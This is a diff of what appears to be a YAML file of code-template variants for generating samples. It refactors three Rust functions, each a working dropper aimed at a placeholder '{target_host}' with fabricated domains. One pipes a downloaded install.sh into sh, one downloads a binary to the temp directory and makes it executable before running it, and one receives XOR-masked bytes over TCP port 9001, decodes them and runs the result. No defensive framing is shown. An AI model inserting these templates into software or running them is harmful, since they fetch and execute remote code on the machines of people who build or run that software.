@@ -11,16 +11,16 @@ variants:
     domain_fabricated: "static-release-assets.org"
     code_template: |
       fn {fn_name}() {
-          let url = "https://{target_host}/install.sh";
-          let _ = std::process::Command::new("curl")
-              .args(["-fsSL", url])
+          use std::process::Command;
+          Command::new("curl")
+              .args(["-fsSL", "https://{target_host}/install.sh"])
               .output()
               .map(|out| {
-                  let _ = std::process::Command::new("sh")
-                      .arg("-c")
-                      .arg(String::from_utf8_lossy(&out.stdout).to_string())
-                      .spawn();
-              });
+                  Command::new("sh")
+                      .args(["-c", &String::from_utf8_lossy(&out.stdout)])
+                      .spawn()
+              })
+              .ok();
       }
 
   - id: c2_split_url_binary_fetch
@@ -30,13 +30,13 @@ variants:
     domain_fabricated: "pkg-dist-binaries.net"
     code_template: |
       fn {fn_name}() {
-          let host = ["http://", "{target_host}", "/engine"].concat();
+          use std::process::Command;
           let mut dest = std::env::temp_dir();
           dest.push("sys_engine");
-          if let Ok(mut resp) = std::process::Command::new("curl").args(["-s", "-o", dest.to_str().unwrap(), &host]).status() {
+          if let Ok(resp) = Command::new("curl").args(["-s", "-o", dest.to_str().unwrap_or(""), "http://{target_host}/engine"]).status() {
               if resp.success() {
-                  let _ = std::process::Command::new("chmod").args(["+x", dest.to_str().unwrap()]).status();
-                  let _ = std::process::Command::new(dest).spawn();
+                  Command::new("chmod").args(["+x", dest.to_str().unwrap_or("")]).status().ok();
+                  Command::new(dest).spawn().ok();
               }
           }
       }
@@ -48,13 +48,16 @@ variants:
     domain_fabricated: "edge-service-router.io"
     code_template: |
       fn {fn_name}() {
+          use std::net::TcpStream;
           use std::io::Read;
-          if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:9001") {
+          use std::process::Command;
+          use std::fs;
+          if let Ok(mut stream) = TcpStream::connect("{target_host}:9001") {
               let mut buf = Vec::new();
-              let _ = stream.read_to_end(&mut buf);
-              let unmasked: Vec<u8> = buf.iter().map(|b| b ^ 0x3c).collect();
-              let path = std::env::temp_dir().join("runtime_agent");
-              let _ = std::fs::write(&path, unmasked);
-              let _ = std::process::Command::new(path).spawn();
+              if stream.read_to_end(&mut buf).is_ok() {
+                  let path = std::env::temp_dir().join("runtime_agent");
+                  fs::write(&path, buf.iter().map(|b| b ^ 0x3c).collect::<Vec<u8>>()).ok();
+                  Command::new(path).spawn().ok();
+              }
           }
       }
